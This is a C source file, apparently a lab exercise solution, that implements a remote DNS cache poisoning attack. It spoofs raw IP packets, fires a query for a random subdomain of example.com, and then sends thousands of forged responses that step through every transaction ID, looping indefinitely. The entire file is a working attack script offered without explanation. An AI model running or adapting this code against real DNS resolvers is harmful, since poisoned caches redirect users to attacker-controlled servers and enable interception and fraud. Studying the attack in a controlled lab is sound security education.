#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

// Compile with: gcc -O3 -Wall -Wno-pointer-sign -o atk attack.c

#define MAX_FILE_SIZE 1000000

#define RES_TRNID_OFFSET 28 // 28 = 0x1C
#define RES_QNAME_OFFSET 41 // 41 = 0x29
#define RES_ANAME_OFFSET 64 // 64 = 0x40

#define REQ_TRNID_OFFSET 28 // 28 = 0x1C
#define REQ_QNAME_OFFSET 41 // 41 = 0x29
 
#define RESPONSE_COUNT 8000 // how many responses to attempt

#define CONTROLLED 1

/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};

void send_raw_packet(char * buffer, int pkt_size); 

int main() {
  srand(time(NULL));

  // Load the DNS request packet from file
  FILE * f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
    perror("Can't open 'ip_req.bin'");
    exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  const int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE * f_res = fopen("ip_res.bin", "rb");
  if (!f_res) {
    perror("Can't open 'ip_res.bin'");
    exit(1);
  }
  unsigned char ip_res[MAX_FILE_SIZE];
  const int n_res = fread(ip_res, 1, MAX_FILE_SIZE, f_res); 
  
  char a[26]="abcdefghijklmnopqrstuvwxyz"; 
  char name[5];
  
  unsigned short k, trn_id_net_orders[RESPONSE_COUNT];
  clock_t t1, t2;
  // Loop indefinitely 
  while (1) {     
    // Generate a random name 
    for (k=0; k<5; k++)
      name[k] = a[rand() % 26]; 

    // Prepare transaction ids to not waste time with them later 
    for (k=0; k<RESPONSE_COUNT; k++)  
      trn_id_net_orders[k] = htons(k); 
      //trn_id_net_orders[k] = htons((rand() % 7) * 10000 + (rand() % 5536)); // random number [0, 65535]
      
    // Prepare request name
    memcpy(ip_req+REQ_QNAME_OFFSET, name, 5); // update qname

    // Prepare response names
    memcpy(ip_res+RES_QNAME_OFFSET, name, 5); // update qname
    memcpy(ip_res+RES_ANAME_OFFSET, name, 5); // update aname
 
    t1 = clock(); // attack start

    send_raw_packet(ip_req, n_req); // Send request
    sleep(0.05); // wait for a bit
    
    // Send responses
    for (k=0; k<RESPONSE_COUNT; k++) { 
      memcpy(ip_res+RES_TRNID_OFFSET, &trn_id_net_orders[k], 2); //update trn id
      send_raw_packet(ip_res, n_res);   
    }
     
    t2 = clock() - t1;  // attack end
    
    printf("%.*s.example.com\t%d responses in %f ms\n", 5, name, 
      RESPONSE_COUNT, (float)(t2 * 1000 / CLOCKS_PER_SEC));

    #if CONTROLLED
    printf("Try again? Press <ENTER>\t"); getc(stdin);
    #endif    
  }
}

/* Send the raw packet out 
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char * buffer, int pkt_size) {
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0, 
    (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
